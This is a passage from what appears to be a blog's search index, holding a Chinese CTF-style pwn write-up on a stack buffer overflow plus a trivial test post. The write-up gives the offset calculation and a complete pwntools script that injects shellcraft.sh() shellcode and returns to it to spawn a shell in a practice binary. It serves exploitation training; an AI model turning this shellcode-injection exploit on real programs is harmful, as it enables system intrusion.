class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>攻击思路</strong></p><ul><li>buf 栈中填入 shellcode , <code>\x00</code> 补满到 padding 处</li><li>rbp: junk 数据  (其实 <code>\x00</code> 补满到 padding 处已经补满 rbp 了 (padding &#x3D; padding2rbp + 8))</li><li>ret 到 buf2 , 执行 shellcode</li></ul><p>计算溢出长度 (等待 read 后输入八字节长度 (x64) 后输入)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance $rsp $rbp</span><br><span class="line">0x7fffffffdb00-&gt;0x7fffffffdc10 is 0x110 bytes (0x22 words)</span><br></pre></td></tr></table></figure><p>rsp 到 rbp 的长度为 <code>0x110</code> , 还需要加 <code>rbp</code> 的八字节</p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">pwnfile = <span class="string">&#x27;./question_6_3_x64&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">buf2_ret = elf.symbols[<span class="string">&#x27;buf2&#x27;</span>]</span><br><span class="line">padding2rbp = <span class="number">0x110</span></span><br><span class="line">padding = padding2rbp + <span class="number">8</span></span><br><span class="line">payload = asm(shellcraft.sh()).ljust(padding, <span class="string">b&#x27;\x00&#x27;</span>) + p64(buf2_ret)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;input:&#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong><code>.ljust(padding, b&#39;\x00&#39;)</code>： 用 <code>\x00</code> 填充至 <code>padding</code> 长度，确保覆盖到返回地址</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Test</title>
      <link href="/2025/03/25/Test/"/>
      <url>/2025/03/25/Test/</url>
      
        <content type="html"><![CDATA[<p>Test</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>The First Post, 2025&#x2F;03&#x2F;25<br><code>Yes</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Test </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
